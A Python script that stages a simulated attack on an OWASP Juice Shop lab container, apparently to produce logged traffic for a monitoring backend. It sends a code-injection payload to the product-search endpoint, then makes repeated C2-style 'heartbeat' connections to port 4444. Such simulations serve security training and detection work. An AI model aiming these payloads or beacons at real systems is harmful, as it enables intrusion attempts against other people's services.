import os
import requests
import time
import socket
import random
import json
import sys

TARGET_URL = os.getenv("TARGET_URL", "http://juice-shop:3000/rest/products/search")
VICTIM_IP = os.getenv("VICTIM_IP", "juice-shop")
C2_PORT = int(os.getenv("C2_PORT", "4444"))

def log_event(event_type, message, metrics=None):
    """Emit a structured JSON log for the backend to parse."""
    data = {
        "timestamp": time.time(),
        "type": event_type,
        "message": message,
        "metrics": metrics or {}
    }
    print(json.dumps(data), flush=True)

# Wait for Juice Shop to be ready
log_event("info", "[*] Waiting for juice-shop:3000 to be ready...")
while True:
    try:
        with socket.create_connection((VICTIM_IP, 3000), timeout=2):
            log_event("success", "[+] juice-shop is up!")
            break
    except (socket.timeout, ConnectionRefusedError):
        time.sleep(2)

# 1. Exploitation Phase (RCE-style payload)
log_event("phase", "Stage 1: Sending RCE Exploit payload...", {"phase": 1})
rce_payload = "'; process.exit(); //" # Simplified RCE-style injection
try:
    r = requests.get(TARGET_URL, params={"q": rce_payload})
    log_event("attack", f"Exploit sent to {TARGET_URL}", {"status_code": r.status_code, "traffic_bytes": len(rce_payload)})
except Exception as e:
    log_event("error", f"Exploit failed: {str(e)}")

time.sleep(2)

# 2. Infiltration / C2 Phase
log_event("phase", f"Stage 2: Starting C2 communication (Infiltration) on port {C2_PORT}...", {"phase": 2})
for i in range(20): # Increased iterations
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(2)
            # log_event("debug", f"Attempting C2 heartbeat {i} to {VICTIM_IP}:{C2_PORT}...")
            s.connect((VICTIM_IP, C2_PORT))
            payload_data = f"heartbeat_{i}_data_{random.getrandbits(32)}"
            msg = payload_data.encode()
            s.sendall(msg)
            
            # Emit traffic metric
            traffic_size = len(msg)
            log_event("traffic", f"C2 heartbeat {i} sent", {"bytes": traffic_size, "packets": 1, "packet_type": "TCP"})
            
    except Exception as e:
        # Expected if Juice Shop isn't listening, but packet is still sent
        log_event("traffic", f"C2 heartbeat {i} attempted", {"bytes": 64, "packets": 1, "packet_type": "TCP/SYN", "error": str(e)})
    
    time.sleep(random.uniform(0.5, 1.5)) # Slightly faster for more concentration

log_event("complete", "Infiltration simulation completed.")
